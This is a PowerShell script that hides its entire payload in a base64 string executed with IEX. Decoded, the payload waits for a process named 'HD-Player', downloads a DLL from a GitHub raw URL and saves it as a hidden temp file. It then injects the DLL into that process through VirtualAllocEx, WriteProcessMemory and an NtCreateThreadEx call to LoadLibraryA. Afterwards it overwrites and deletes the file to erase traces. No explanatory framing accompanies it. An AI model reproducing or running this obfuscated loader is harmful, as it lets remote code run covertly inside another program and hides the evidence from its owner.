$enc = "IyBXaW5BUEkgYmluZGluZ3MNCiRzaWduYXR1cmUgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KDQpwdWJsaWMgY2xhc3MgV2luMzIgew0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2VzcyhpbnQgZHdEZXNpcmVkQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgZHdQcm9jZXNzSWQpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCB1aW50IG5TaXplLCBvdXQgdWludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBscFByb2NOYW1lKTsNCg0KICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRDcmVhdGVUaHJlYWRFeChvdXQgSW50UHRyIHRocmVhZEhhbmRsZSwgdWludCBkZXNpcmVkQWNjZXNzLCBJbnRQdHIgb2JqZWN0QXR0cmlidXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSW50UHRyIHByb2Nlc3NIYW5kbGUsIEludFB0ciBzdGFydEFkZHJlc3MsIEludFB0ciBwYXJhbWV0ZXIsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBib29sIGNyZWF0ZVN1c3BlbmRlZCwgaW50IHplcm9CaXRzLCBpbnQgc3RhY2tTaXplLCBpbnQgbWF4aW11bVN0YWNrU2l6ZSwgSW50UHRyIGF0dHJpYnV0ZUxpc3QpOw0KfQ0KIkANCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkc2lnbmF0dXJlIC1QYXNzVGhydQ0KDQpmdW5jdGlvbiBHZXQtUHJvY2Vzc0lkQnlOYW1lKCRuYW1lKSB7DQogICAgJHByb2MgPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7ICRfLlByb2Nlc3NOYW1lIC1saWtlICRuYW1lIH0NCiAgICByZXR1cm4gJHByb2MuSWQNCn0NCg0KJGRsbFVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2hyZXlhc2dsaXRjaC9wcy9tYWluL3Rlc3QuZGxsIg0KJFBST0NFU1NfQUxMX0FDQ0VTUyA9IDB4MUYwRkZGDQokTUVNX0NPTU1JVCA9IDB4MTAwMA0KJE1FTV9SRVNFUlZFID0gMHgyMDAwDQokUEFHRV9FWEVDVVRFX1JFQURXUklURSA9IDB4NDANCg0Kd2hpbGUgKCR0cnVlKSB7DQogICAgJHBpZCA9IEdldC1Qcm9jZXNzSWRCeU5hbWUgIkhELVBsYXllciINCiAgICBpZiAoJHBpZCkgew0KICAgICAgICBXcml0ZS1Ib3N0ICJbK10gSEQtUGxheWVyIGZvdW5kIChQSUQ6ICRwaWQpIg0KICAgICAgICAkaFByb2Nlc3MgPSBbV2luMzJdOjpPcGVuUHJvY2VzcygkUFJPQ0VTU19BTExfQUNDRVNTLCAkZmFsc2UsICRwaWQpDQoNCiAgICAgICAgaWYgKCRoUHJvY2VzcyAtbmUgMCkgew0KICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCiAgICAgICAgICAgICRkbGxCeXRlcyA9ICR3ZWJjbGllbnQuRG93bmxvYWREYXRhKCRkbGxVcmwpDQoNCiAgICAgICAgICAgICMgQ3JlYXRlIHRlbXAgZmlsZSwgaGlkZGVuDQogICAgICAgICAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgW1N5c3RlbS5JTy5QYXRoXTo6R2V0UmFuZG9tRmlsZU5hbWUoKSArICIuZGxsIikNCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJHRlbXBQYXRoLCAkZGxsQnl0ZXMpDQogICAgICAgICAgICAoR2V0LUl0ZW0gJHRlbXBQYXRoKS5BdHRyaWJ1dGVzID0gIkhpZGRlbiINCg0KICAgICAgICAgICAgIyBFbmNvZGUgcGF0aCB0byBudWxsLXRlcm1pbmF0ZWQgYnl0ZVtdDQogICAgICAgICAgICAkZGxsUGF0aEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJHRlbXBQYXRoICsgW2NoYXJdMCkNCg0KICAgICAgICAgICAgIyBBbGxvY2F0ZSBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MNCiAgICAgICAgICAgICRhbGxvY01lbSA9IFtXaW4zMl06OlZpcnR1YWxBbGxvY0V4KCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRkbGxQYXRoQnl0ZXMuTGVuZ3RoLCAkTUVNX0NPTU1JVCAtYm9yICRNRU1fUkVTRVJWRSwgJFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpDQoNCiAgICAgICAgICAgIGlmICgkYWxsb2NNZW0gLW5lIDApIHsNCiAgICAgICAgICAgICAgICAjIFdyaXRlIHBhdGggdG8gcmVtb3RlIHByb2Nlc3MNCiAgICAgICAgICAgICAgICBbV2luMzJdOjpXcml0ZVByb2Nlc3NNZW1vcnkoJGhQcm9jZXNzLCAkYWxsb2NNZW0sICRkbGxQYXRoQnl0ZXMsICRkbGxQYXRoQnl0ZXMuTGVuZ3RoLCBbcmVmXTApDQoNCiAgICAgICAgICAgICAgICAkaEtlcm5lbDMyID0gW1dpbjMyXTo6R2V0TW9kdWxlSGFuZGxlKCJrZXJuZWwzMi5kbGwiKQ0KICAgICAgICAgICAgICAgICRsb2FkTGlicmFyeSA9IFtXaW4zMl06OkdldFByb2NBZGRyZXNzKCRoS2VybmVsMzIsICJMb2FkTGlicmFyeUEiKQ0KDQogICAgICAgICAgICAgICAgW0ludFB0cl0kaFRocmVhZCA9IFtJbnRQdHJdOjpaZXJvDQogICAgICAgICAgICAgICAgJHJlc3VsdCA9IFtXaW4zMl06Ok50Q3JlYXRlVGhyZWFkRXgoW3JlZl0kaFRocmVhZCwgMHgxRkZGRkYsIFtJbnRQdHJdOjpaZXJvLCAkaFByb2Nlc3MsICRsb2FkTGlicmFyeSwgJGFsbG9jTWVtLCAkZmFsc2UsIDAsIDAsIDAsIFtJbnRQdHJdOjpaZXJvKQ0KDQogICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQgLWVxIDApIHsNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIEluamVjdGVkIHN1Y2Nlc3NmdWxseSDDosWT4oCmIg0KDQogICAgICAgICAgICAgICAgICAgICMgw7DFuMKnwr0gQ2xlYW4gdHJhY2UNCiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAzMDAgICMgd2FpdCBhIGJpdCBmb3Igc2FmZXR5DQogICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkdGVtcFBhdGgsICIwIikgICMgT3ZlcndyaXRlIGZpbGUgY29udGVudA0KICAgICAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkdGVtcFBhdGggLUZvcmNlICAjIERlbGV0ZSBETEwNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gSW5qZWN0aW9uIGZhaWxlZCDDosKdxZIgQ29kZTogJHJlc3VsdCINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQ0KfQ=="

IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc)))
